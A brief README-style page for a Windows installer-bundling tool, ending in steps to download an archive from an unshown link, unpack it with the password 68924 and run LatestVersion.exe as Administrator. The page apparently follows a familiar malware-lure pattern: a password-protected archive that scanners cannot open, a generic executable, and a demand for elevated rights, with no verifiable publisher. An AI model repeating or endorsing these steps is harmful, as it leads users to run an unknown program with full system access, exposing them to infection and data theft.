## What This Tool Does

- Bundle multiple installers (EXE, MSI, BAT) into one pack
- Run installations automatically in sequence
- Support for silent install parameters
- Save custom installation profiles
- Create portable installation packs
- Works on Windows 10 and 11

## How to Use

1. Download the archive from the link above
2. Extract with password 68924
3. Right-click LatestVersion.exe and select Run as Administrator
4. Add installers to the pack
5. Configure installation order
6. Click Create Pack - the offline installer is created instantly
